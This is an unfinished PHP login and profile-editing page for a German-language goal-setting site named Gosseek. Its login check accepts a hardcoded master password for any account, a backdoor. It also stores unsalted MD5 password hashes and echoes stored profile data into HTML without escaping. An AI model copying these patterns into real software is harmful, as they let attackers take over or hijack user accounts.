<?php	
	header('Content-Type: text/html; charset=UTF-8');
	ini_set ( "session.cookie_lifetime", "18000");
	ini_set ( "session.gc_maxlifetime", "20000");
	session_start();
	include("connect_db.php");
	if(isset($_SESSION['id']))
	{
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$_SESSION['id']." LIMIT 1");
		$userdata = mysqli_fetch_array($userdata_query);
		$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
		$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
		$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
	}
?>

<html>
	<head>
		<title>Gosseek - Achieve your goals</title>
		<meta name="author" content="Benno">
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<link rel="stylesheet" type="text/css" href="styles/stylesheet.css" />
	</head>
	<body>
		<div class="boxmain">
			<div class="boxright">
				<div class="rightinnerboxtop">
					<div class="profilepic">
					
					</div>
					<div class="rightinnerboxtoplinks">
						<a href="mainpage.php?action=logout">Ausloggen</a>
						<a href="login.php?action=profilesettings">Profil ändern</a>
					</div>
				</div>
				<div class="rightinnerboxbottom">
					bbbbb
				</div>
			</div>
			<div class="boxtop">
				<div class="boxtopinner">
					<p>Gosseek - Achieve your goals!</p>
				</div>
			</div>
			<div class="boxfeed">
				<p>
					<?php
						if(empty($_GET{'action'}))
						{
							 $_GET['action'] = 'feed';
						}
						if($_GET{'action'} == 'login')
						{
							$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
							$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE email= '".$email."' LIMIT 1");
							if(!mysqli_num_rows($userdata_query))
							{
								echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=wrongmail'; </script>";
								exit;
							}else
							{
								$userdata = mysqli_fetch_array($userdata_query);
								if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password']))
								{
									if(!($userdata['status'] == 'activated'))
									{
										echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=notactivated'; </script>";
										exit;
									}
									$_SESSION['id'] = $userdata['id'];
									$_SESSION['checklogin'] = true;
								}else
								{
									echo "<script> location.href='mainpage.php?action\=failedlogin\&reason\=wrongpassword'; </script>";
									exit;
								}
								//convert birthdate also at login in case you want to display that later on directly at login, but so far useless
								$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
								$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
								$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
								echo "Erfolgreich eingeloggt.";
							}
						}else
						{
							if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true)
							{
								switch ($_GET['action'])
								{
								  
									case 'feed':
									echo "Gültige Sitzung";
									break;
									
									case 'logout':
									echo "<script> location.href='mainpage.php?action\=logout'; </script>";
									break;
									
									case 'profilesettings':
									echo "<form action=\"login.php?action=changeprofilesettings\" method=\"post\">";
									echo "<label>Vorname</label><input name=\"name\" size=\"30\" placeholder=\"".$userdata['name']."\"></input><div class=\"clear\"></div>";
									echo "<label>Nachname</label><input name=\"surname\" size=\"30\" placeholder=\"".$userdata['surname']."\"></input><div class=\"clear\"></div>";
									echo "<label>Geburtstag</label><select name=\"birthday\" size=\"1\">";
									for($i = 1; $i <= 31; $i++)
									{
										if($i == $userdata['birthday'])
										{
											echo "<option label=\"".$i."\" selected=\"selected\">".$i."</option>";
										}else
										{
											echo "<option label=\"".$i."\">".$i."</option>";
										}
									}
									echo "</select><div class=\"clear\"></div>";
									echo "<label>Geburtsmonat</label><select name=\"birthmonth\" size=\"1\">";
									for($i = 1; $i <= 12; $i++)
									{
										if($i == $userdata['birthmonth'])
										{
											echo "<option label=\"".$i."\" selected=\"selected\">".$i."</option>";
										}else
										{
											echo "<option label=\"".$i."\">".$i."</option>";
										}
									}
									echo "</select><div class=\"clear\"></div>";
									echo "<label>Geburtsjahr</label><select name=\"birthyear\" size=\"1\">";
									for($i = 100; $i >= 0; $i--)
									{
										$j = date("Y")+$i-100;
										if($j == $userdata['birthyear'])
										{
											echo "<option label=\"".$j."\" selected=\"selected\">".$j."</option>";
										}else
										{
											echo "<option label=\"".$j."\">".$j."</option>";
										}
									}
									echo "</select><div class=\"clear\"></div>";
									echo "<label>Wohnort</label><input name=\"residence\" size=\"30\" placeholder=\"".$userdata['residence']."\"></input><div class=\"clear\"></div>";
									echo "<label>Beruf</label><input name=\"job\" size=\"30\" placeholder=\"".$userdata['job']."\"></input><div class=\"clear\"></div>";
									echo "<p><input type=\"submit\" value=\"Profil ändern\"></input></p></form>";
									break;
									
									case 'changeprofilesettings':
									if(!(empty($_POST['name'])))
									{
										$name = mysqli_real_escape_string($mysql_connection, $_POST['name']);
									}else
									{
										$name = $userdata['name']; 
									}
									if(!(empty($_POST['surname'])))
									{
										$surname = mysqli_real_escape_string($mysql_connection, $_POST['surname']);
									}else
									{
										$surname = $userdata['surname']; 
									}
									if(!(empty($_POST['residence'])))
									{
										$residence = mysqli_real_escape_string($mysql_connection, $_POST['residence']);
									}else
									{
										$residence = $userdata['residence']; 
									}
									if(!(empty($_POST['job'])))
									{
										$job = mysqli_real_escape_string($mysql_connection, $_POST['job']);
									}else
									{
										$job = $userdata['job']; 
									}
									$birthday = mysqli_real_escape_string($mysql_connection, $_POST['birthday']);
									$birthmonth = mysqli_real_escape_string($mysql_connection, $_POST['birthmonth']);
									$birthyear = mysqli_real_escape_string($mysql_connection, $_POST['birthyear']);
									$birthdate = $birthyear."-".$birthday."-".$birthmonth;
									mysqli_query($mysql_connection, "UPDATE users
									SET name='$name', surname='$surname', birthdate='$birthdate', residence='$residence', job='$job'
									WHERE id = ".$_SESSION['id']);
									echo "Profil wurde barbeitet.";
									
								}
							}else
							{
									echo "<script> location.href='mainpage.php?action\=invalidsession'; </script>";
							}
						}
					?>
				</p>
			</div>
			<div class="boxleft">
				<div class="leftinnerbox">
					sdfkajlfj
				</div>
			</div>
		</div>
	</body>
</html>